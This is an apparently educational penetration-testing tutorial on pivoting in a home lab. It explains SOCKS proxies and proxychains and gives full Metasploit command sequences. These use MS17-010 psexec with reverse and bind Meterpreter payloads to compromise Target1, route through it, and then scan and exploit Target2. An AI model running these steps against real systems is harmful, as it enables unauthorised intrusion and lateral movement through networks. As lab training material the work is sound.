
````markdown
# Pivoting and Routing Tables in Penetration Testing

This document outlines the steps to perform pivoting between two target machines (`Target1` and `Target2`) using Kali Linux and Metasploit. It also explains the role of SOCKS proxies and Proxychains in facilitating pivoting.

---

## Description

### What is Pivoting?
- **Pivoting** is the technique of using a compromised machine (`Target1`) as a springboard to access another machine (`Target2`) in a different or isolated network.
- It’s often necessary when networks are segmented, and the attacker doesn’t have direct access to internal machines.

---

### What is a SOCKS Proxy?
- A **SOCKS proxy** is a generic proxy protocol that can forward any kind of network traffic (TCP/UDP) between a client and a server.
- In penetration testing:
  - It allows routing of traffic **through the compromised host** (`Target1`) into the internal network.
  - Makes the attacker’s tools behave as if they were running *from inside Target1*.
  - Without SOCKS, traffic generated on the attacker machine would never reach the internal network.

---

### What is Proxychains?
- **Proxychains** is a Linux tool that forces any network program (e.g., `nmap`, `msfconsole`, `sqlmap`) to connect through a proxy (like SOCKS).
- Features:
  - **Transparent Proxying**: You don’t need every tool to natively support proxies.
  - **Multiple Proxies in Chain**: Traffic can be bounced through multiple proxies for stealth.
  - **Practical Usage**: Lets you run scanners and exploits directly from your Kali box as if you were on the pivot host.

---

### Why Use SOCKS + Proxychains Together?
- Metasploit’s **autoroute** only redirects traffic **inside the Meterpreter session**.
  - This means you’re limited to running Metasploit modules that support pivoting — you can’t just use `nmap` or other external tools.
- By enabling a **SOCKS proxy** in Metasploit and using **Proxychains** on Kali:
  - Any external tool can send traffic through `Target1` to reach `Target2`.
  - You’re no longer confined to just one Meterpreter session.
- **Without SOCKS & Proxychains**:
  - You could only interact with `Target2` through Metasploit modules inside that single Meterpreter session.
  - You’d lose flexibility for using third-party tools (`nmap`, `crackmapexec`, etc.).

---

## Network Configuration

- **Kali Linux (Attacker)**
  - Bridge Adaptor (BA): `192.168.0.139`

- **Windows 10 (Target1)**
  - Bridge Adaptor (BA): `192.168.0.117`
  - Host-Only Adaptor (HA): `192.168.205.105`

- **Windows 10 Clone (Target2)**
  - Host-Only Adaptor (HA): `192.168.205.106`

---

## Step 1: Gaining Access to Target1
```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set payload windows/x64/meterpreter/reverse_tcp
set RHOST 192.168.0.117
set SMBUSER forensic
set SMBPASS admin
set LHOST 192.168.0.139
set LPORT 6622
exploit
````

---

## Step 2: Adding Routing Table for Pivoting

```bash
use post/multi/manage/autoroute
set SESSION 1
run
route
```

---

## Step 3: Enabling SOCKS Proxy in Metasploit

```bash
use auxiliary/server/socks_proxy
run
jobs
```

---

## Step 4: Configuring Proxychains

```bash
mousepad /etc/proxychains4.conf
```

* Uncomment:

  ```text
  dynamic_chain
  ```
* Comment:

  ```text
  strict_chain
  ```
* Add SOCKS proxy:

  ```text
  socks5 127.0.0.1 1080
  ```

---

## Step 5: Scanning and Exploiting Target2

```bash
proxychains nmap -p 139,445 -sT -n -Pn 192.168.205.106
proxychains msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOST 192.168.205.106
set SMBUSER forensic
set SMBPASS admin
set LPORT 6644
exploit
```

---

## Key Takeaways

* **SOCKS Proxy**: Creates a tunnel through the compromised host into the internal network.
* **Proxychains**: Lets any tool on Kali use that proxy, not just Metasploit.
* **Without SOCKS & Proxychains**: You’d be stuck inside one Meterpreter shell, only able to use built-in Metasploit modules for pivoting.
* **With SOCKS & Proxychains**: You can run `nmap`, `sqlmap`, `msfconsole`, or any other tool seamlessly against internal targets.
